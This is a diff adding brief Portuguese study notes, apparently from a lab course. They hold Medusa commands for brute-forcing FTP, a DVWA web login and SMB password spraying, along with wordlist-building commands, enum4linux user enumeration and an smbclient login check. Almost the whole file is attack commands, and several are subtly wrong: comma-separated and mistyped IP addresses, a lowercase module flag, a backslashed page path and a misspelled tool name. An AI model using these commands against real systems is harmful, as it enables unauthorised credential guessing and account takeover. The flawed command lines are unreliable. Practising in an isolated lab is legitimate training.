@@ -1,0 +1,30 @@
+comando MEDUSA para ataque Brute force 
+medusa -h 192,168,56,102 -U user.txt -P pass.txt -M ftp -t 6
+
+código MEDUSA utilizado para  automação e tentativas em web
+medusa -h 192.168.56.102 -U users.txt -P pass.txt -m http \
+-m PAGE:'dvwa\login.php'\
+-m FORM:'username=^USER^&password=^PASS^&Login=Login' \
+-m 'FAIL=Login failed' -t 6
+
+Código MEDUSA ataques password spraying em SMB 
+medusa -h 192,168,56,102 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50
+-U e -P = nome da wordlist criada
+-M(maiúsculo) = tipo de serviço
+-t = quantidade de Threads
+-T(maiúsculo) = limite de host paralelo
+
+Criar WordList Simples
+echo -e "user\nmsfadmin\nadmin\nroot" > users.txt
+echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt
+echo -e "user\nmsfadmin\nservice" > smb_users.txt
+echo -e "password\n123456\nWelcome\nmsfadmin" > senhas_spray.txt
+
+Código para enumeração de usuários
+enum4linux -a 192.168.56.102 | tee enum4_output.txt
+-a = todas as tecnica de enumeração
+tee enum4_output.txt = para salvar saída do comando em um arquivo
+
+Código para verificar se teve sucesso na captura de usuário
+smb client -L //192.18.56.102 -U msfadmin
+-U = usuário capturado com medusa
